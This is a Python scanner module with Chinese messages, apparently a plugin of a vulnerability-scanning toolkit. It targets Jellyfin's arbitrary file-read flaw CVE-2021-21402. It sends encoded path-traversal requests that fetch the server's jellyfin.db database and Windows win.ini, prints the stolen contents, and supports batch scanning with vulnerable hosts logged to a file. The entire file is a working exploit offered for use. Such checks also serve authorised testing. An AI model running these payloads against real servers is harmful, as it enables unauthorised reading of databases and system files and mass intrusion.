#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests
import urllib3
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2021_21402:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,urls):
        payload1 = '/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3'
        payload2 = '/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/'
        poc1 = urls + payload1
        poc2 = urls + payload2
        n = 0
        try:
            requests.packages.urllib3.disable_warnings()  # 解决InsecureRequestWarning警告
            response = requests.get(poc1, verify=self.verify,proxies=self.proxy,headers=self.header, timeout=10)
            response2 = requests.get(poc2, verify=self.verify,proxies=self.proxy,headers=self.header, timeout=10)
            content2 = response2.content.decode()
            content = response.content.decode()
            if response2.status_code == 200 and "font" in response2.text and "file" in response2.text:
                n = 1
            if response.status_code == 200 and "font" in response.text and "file" in response.text:
                n = 1
            if n == 1:
                if not self.batch:
                    OutPrintInfoSuc("Jellyfin", f"存在Jellyfin任意文件读取漏洞CVE-2021-21402")
                    OutPrintInfo("Jellyfin", poc2)
                    OutPrintInfo("Jellyfin", f"Content: \n{content2}")
                    OutPrintInfo("Jellyfin", poc1)
                    OutPrintInfo("Jellyfin", f"Content: \n{content}")
                else:
                    OutPrintInfoSuc("Jellyfin", f"存在Jellyfin任意文件读取漏洞{urls}")
                    OutPutFile("jellyfin_file_read.txt", f"存在Jellyfin任意文件读取漏洞{urls}")
            else:
                if not self.batch:
                    OutPrintInfo("Jellyfin", "不存在Jellyfin任意文件读取漏洞CVE-2021-21402")
        except Exception:
            if not self.batch:
                OutPrintInfo("Jellyfin", "不存在Jellyfin任意文件读取漏洞CVE-2021-21402")


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Jellyfin", "开始检测Jellyfin任意文件读取漏洞CVE-2021-21402...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Jellyfin", "Jellyfin任意文件读取漏洞CVE-2021-21402检测结束")

